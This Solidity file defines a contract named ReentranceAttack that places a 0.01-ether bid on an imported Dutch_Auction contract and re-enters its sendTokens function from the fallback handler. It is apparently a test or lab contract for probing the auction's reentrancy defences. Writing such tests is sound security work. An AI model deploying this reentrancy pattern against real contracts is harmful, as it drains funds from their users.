// SPDX-License-Identifier: MIT

pragma solidity ^0.8.21;

import "./Dutch_Auction.sol";

contract ReentranceAttack {
    Dutch_Auction target;

    constructor(address payable _target) {
        target = Dutch_Auction(_target);
    }

    function ReentranceAttack1() public payable {
        target.addBidder{value: 0.01 ether}();
    }

    fallback() external payable {
        target.sendTokens();
    }

    receive() external payable {}
}
